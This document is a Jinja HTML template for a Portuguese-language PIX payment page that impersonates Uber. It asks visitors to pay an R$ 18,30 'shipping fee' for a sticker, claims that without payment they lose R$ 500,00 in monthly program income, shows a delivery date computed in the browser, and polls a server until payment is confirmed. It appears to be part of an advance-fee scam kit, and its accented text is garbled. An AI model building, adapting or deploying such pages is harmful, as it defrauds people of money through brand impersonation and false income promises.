{% extends "layout.html" %}

{% block title %}Pagamento Frete Adesivo - Uber{% endblock %}

{% block content %}
<div class="min-h-screen bg-white py-8">
    <div class="max-w-2xl mx-auto px-4">
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-black mb-2">Pagamento do Frete</h1>
            <p class="text-gray-600">Complete o pagamento via PIX para receber seu adesivo Uber</p>
        </div>

        <!-- Box de Aviso Importante acima do pagamento -->
        <div class="flex flex-col items-center mb-6">
            <div class="bg-yellow-100 border border-yellow-300 p-3 rounded mb-4 max-w-2xl mx-auto">
                <p class="text-yellow-800 text-base font-semibold text-center mb-4">丘멆잺 IMPORTANTE: Sem o pagamento do frete, o adesivo n칚o ser치 enviado e voc칡 n칚o poder치 participar do Programa, perdendo a renda de R$ 500,00 mensais.</p>
                <div class="flex justify-center">
                    <img src="https://i.ibb.co/1JQ5QnxH/1-1.png" alt="Adesivo Uber" class="h-56 w-auto rounded">
                </div>
            </div>
            
            {% if payment_data %}
            <!-- Payment Status Box -->
            <div class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
                <!-- Centralized Loading Dots -->
                <div class="flex justify-center mb-3">
                    <div class="loading-dots-payment">
                        <div class="dot-payment"></div>
                        <div class="dot-payment"></div>
                        <div class="dot-payment"></div>
                    </div>
                </div>
                <div class="text-center">
                    <span class="text-gray-700 font-medium text-base">Aguardando pagamento para finalizar</span>
                    <div class="mt-2">
                        <p class="text-sm text-gray-600">游닍 Seu adesivo chegar치 <strong id="deliveryDate"></strong></p>
                    </div>
                </div>
            </div>

            <!-- PIX Payment Details -->
            <div class="bg-white border border-gray-300 rounded p-6 mb-6 max-w-2xl mx-auto">
                <div class="text-center mb-6">
                    <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" 
                         alt="PIX Banco Central" class="h-8 mx-auto mb-4">
                    <h3 class="text-xl font-bold text-gray-800 mb-2">Frete Sedex</h3>
                    <div class="text-2xl font-bold text-green-600 mb-2">R$ 18,30</div>
                </div>

                <div class="grid md:grid-cols-2 gap-6">
                    <!-- QR Code -->
                    <div class="text-center">
                        <div class="bg-white p-4 border border-gray-300 rounded inline-block">
                            {% if payment_data and payment_data.pixQrCode %}
                                {% if payment_data.pixQrCode.startswith('data:image') %}
                                    <img src="{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
                                {% elif payment_data.pixQrCode.startswith('http') %}
                                    <img src="{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
                                {% else %}
                                    <img src="data:image/png;base64,{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
                                {% endif %}
                            {% else %}
                                <div id="qrcode-generated" style="width: 200px; height: 200px; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; background: #f8f9fa;">
                                    <span style="color: #666; font-size: 14px;">Gerando QR Code...</span>
                                </div>
                            {% endif %}
                        </div>
                        <p class="text-sm text-gray-600 mt-2">Escaneie com seu app banc치rio</p>
                    </div>

                    <!-- PIX Code and Copy Button -->
                    <div class="flex flex-col justify-center">
                        <div class="mb-4">
                            <h4 class="font-semibold text-gray-800 mb-2">C칩digo PIX para copiar:</h4>
                            <div class="bg-gray-100 border border-gray-300 rounded p-3 text-xs font-mono break-all" id="pixCodeDisplay">
                                {% if payment_data and payment_data.pixCode %}
                                {{ payment_data.pixCode }}
                                {% else %}
                                Carregando c칩digo PIX...
                                {% endif %}
                            </div>
                        </div>
                        
                        <button onclick="copyPixCode()" 
                                style="background: #28a745 !important; color: white !important; border: none !important; padding: 12px 24px !important; border-radius: 4px !important; cursor: pointer !important; font-weight: bold !important; transition: all 0.3s ease !important; width: 100%; margin-bottom: 16px;"
                                class="copy-button w-full mb-4" 
                                id="copyButton"
                                onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 8px rgba(0,0,0,0.2)'"
                                onmouseout="this.style.background='#28a745'; this.style.transform='none'; this.style.boxShadow='none'">
                            <i class="fa fa-copy" style="margin-right: 8px;"></i>Copiar c칩digo PIX
                        </button>

                        <div class="text-sm text-gray-600">
                            <p class="mb-1">1. Abra seu app banc치rio</p>
                            <p class="mb-1">2. Escolha a op칞칚o PIX</p>
                            <p class="mb-1">3. Escaneie o QR Code ou cole o c칩digo</p>
                            <p>4. Confirme o pagamento</p>
                        </div>
                    </div>
                </div>


            </div>
            {% else %}
            <div class="bg-white border border-gray-300 rounded p-6 text-center max-w-2xl mx-auto">
                <!-- Centralized Loading Dots -->
                <div class="flex justify-center mb-4">
                    <div class="loading-dots-payment">
                        <div class="dot-payment"></div>
                        <div class="dot-payment"></div>
                        <div class="dot-payment"></div>
                    </div>
                </div>
                <h3 class="text-xl font-bold text-gray-800">Carregando dados do pagamento...</h3>
            </div>
            {% endif %}
        </div>
    </div>
</div>

<script>
// Gerar QR Code usando API externa se n칚o houver pixQrCode
function generateQRCodeFromAPI() {
    const pixCodeElement = document.getElementById('pixCodeDisplay');
    const pixCode = pixCodeElement ? pixCodeElement.textContent.trim() : '';
    const qrContainer = document.getElementById('qrcode-generated');
    
    console.log('Verificando c칩digo PIX:', pixCode);
    
    if (pixCode && pixCode.length > 20 && !pixCode.includes('Carregando') && qrContainer) {
        console.log('Gerando QR Code via API para c칩digo PIX:', pixCode.substring(0, 50) + '...');
        
        // Usar API p칰blica para gerar QR Code
        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
        
        qrContainer.innerHTML = `<img src="${qrApiUrl}" alt="QR Code PIX" style="width: 200px; height: 200px;">`;
        console.log('QR Code gerado com sucesso via API!');
    } else {
        console.log('C칩digo PIX n칚o dispon칤vel para gerar QR Code');
        // Tentar novamente em 2 segundos
        setTimeout(generateQRCodeFromAPI, 2000);
    }
}

// Fun칞칚o para copiar c칩digo PIX
function copyPixCode() {
    const pixCodeElement = document.getElementById('pixCodeDisplay');
    const pixCode = pixCodeElement ? pixCodeElement.textContent.trim() : '';
    
    if (pixCode && pixCode.length > 20) {
        navigator.clipboard.writeText(pixCode).then(function() {
            const button = document.getElementById('copyButton');
            button.innerHTML = '<i class="fa fa-check" style="margin-right: 8px;"></i>Copiado!';
            button.style.background = '#28a745';
            button.style.color = 'white';
            console.log('PIX code copied to clipboard');
        }, function(err) {
            console.error('Could not copy text: ', err);
            // Fallback para navegadores mais antigos
            const textArea = document.createElement("textarea");
            textArea.value = pixCode;
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                document.execCommand('copy');
                const button = document.getElementById('copyButton');
                button.innerHTML = '<i class="fa fa-check" style="margin-right: 8px;"></i>Copiado!';
                button.style.background = '#28a745';
                button.style.color = 'white';
            } catch (err) {
                console.error('Fallback: Could not copy text: ', err);
            }
            document.body.removeChild(textArea);
        });
    } else {
        alert('C칩digo PIX n칚o dispon칤vel');
    }
}

// Gerar QR Code quando a p치gina carrega
document.addEventListener('DOMContentLoaded', function() {
    // Aguardar um pouco para garantir que o DOM est치 totalmente carregado
    setTimeout(function() {
        generateQRCodeFromAPI();
    }, 1000);
});

// Monitoramento autom치tico do status do pagamento
{% if transaction_id %}
function checkPaymentStatus() {
    const transactionId = '{{ transaction_id }}';
    
    if (!transactionId) {
        console.log('No transaction ID available');
        return;
    }
    
    console.log('Checking payment status for transaction:', transactionId);
    
    fetch(`/check_payment_status/${transactionId}`)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Payment status check result:', data);
            
            // Check for APPROVED status or redirect flag
            if (data.success && (data.status === 'APPROVED' || data.status === 'completed' || data.redirect)) {
                console.log('Payment approved! Redirecting to /finalizar...');
                clearInterval(paymentCheckInterval);
                window.location.href = '/finalizar';
            } else if (data.status) {
                console.log('Payment status:', data.status);
            }
        })
        .catch(error => {
            console.error('Error checking payment status:', error);
        });
}

// Verificar status a cada 1 segundo (1000ms) conforme solicitado
const paymentCheckInterval = setInterval(checkPaymentStatus, 1000);

// Verifica칞칚o inicial imediata
setTimeout(checkPaymentStatus, 100);

// Limpar interval quando a p치gina 칠 fechada
window.addEventListener('beforeunload', function() {
    if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
    }
});
{% endif %}

// Calculate delivery date (3 days from now)
function calculateDeliveryDate() {
    const today = new Date();
    const deliveryDate = new Date(today);
    deliveryDate.setDate(today.getDate() + 3);
    
    const weekdays = ['domingo', 'segunda-feira', 'ter칞a-feira', 'quarta-feira', 'quinta-feira', 'sexta-feira', 's치bado'];
    const weekday = weekdays[deliveryDate.getDay()];
    
    const day = deliveryDate.getDate().toString().padStart(2, '0');
    const month = (deliveryDate.getMonth() + 1).toString().padStart(2, '0');
    const year = deliveryDate.getFullYear();
    
    return `${weekday} ${day}/${month}/${year}`;
}

// Set delivery date when page loads
document.addEventListener('DOMContentLoaded', function() {
    const deliveryElement = document.getElementById('deliveryDate');
    if (deliveryElement) {
        deliveryElement.textContent = calculateDeliveryDate();
    }
});
</script>

<style>
.loading-dots-payment {
    display: flex;
    gap: 4px;
    justify-content: center;
    align-items: center;
}

.dot-payment {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background-color: #6b7280;
    animation: pulse-payment 1.4s ease-in-out infinite both;
}

.dot-payment:nth-child(1) {
    animation-delay: -0.32s;
}

.dot-payment:nth-child(2) {
    animation-delay: -0.16s;
}

.dot-payment:nth-child(3) {
    animation-delay: 0;
}

@keyframes pulse-payment {
    0%, 80%, 100% {
        transform: scale(0.6);
        opacity: 0.5;
    }
    40% {
        transform: scale(1);
        opacity: 1;
    }
}
</style>

{% endblock %}